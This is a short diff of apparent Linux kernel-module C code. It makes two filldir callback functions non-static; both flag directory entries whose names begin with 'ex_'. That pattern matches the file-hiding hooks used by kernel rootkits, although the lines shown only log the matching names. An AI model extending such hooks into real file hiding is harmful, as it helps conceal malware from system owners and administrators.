@@ -1,9 +1,10 @@
 /*
     Пока только по подстроке тут
 */
+#include "files.h"
 
 
-static bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
+bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
     if (strncmp(name, "ex_", strlen("ex_")) == 0) {
         pr_info("%s\n", name);
@@ -15,7 +16,7 @@ static bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, 
     return ret;
 }
 
-static bool ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
+bool ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
     if (strncmp(name, "ex_", strlen("ex_")) == 0) {
         pr_info("%s\n", name);
